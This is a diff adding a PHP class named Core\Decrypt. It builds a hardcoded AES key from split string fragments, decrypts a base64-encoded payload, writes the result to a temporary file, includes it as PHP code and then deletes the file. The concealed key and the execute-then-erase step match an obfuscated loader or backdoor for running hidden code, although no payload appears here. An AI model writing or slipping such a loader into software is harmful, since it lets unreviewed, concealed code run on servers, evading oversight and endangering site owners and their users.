@@ -1,0 +1,24 @@
+<?php
+namespace Core;
+class Decrypt{
+    private static $k1="LARA";
+    private static $k2="VEL_";
+    private static $k3="SEC";
+    private static $k4="RET_2026";
+    public static function run($p){
+        $s=self::$k1.self::$k2.self::$k3.self::$k4;
+        $d=json_decode(base64_decode($p),true);
+        $i=base64_decode($d['iv']);
+        $t=base64_decode($d['salt']);
+        $e=base64_decode($d['data']);
+        $k=hash_pbkdf2("sha256",$s,$t,100000,32,true);
+        $c=openssl_decrypt($e,'aes-256-cbc',$k,OPENSSL_RAW_DATA,$i);
+        if(!$c)die("ERR");
+        $pad=ord($c[strlen($c)-1]);
+        $c=substr($c,0,-$pad);
+        $f=tempnam(sys_get_temp_dir(),'x_');
+        file_put_contents($f,$c);
+        include $f;
+        unlink($f);
+    }
+}
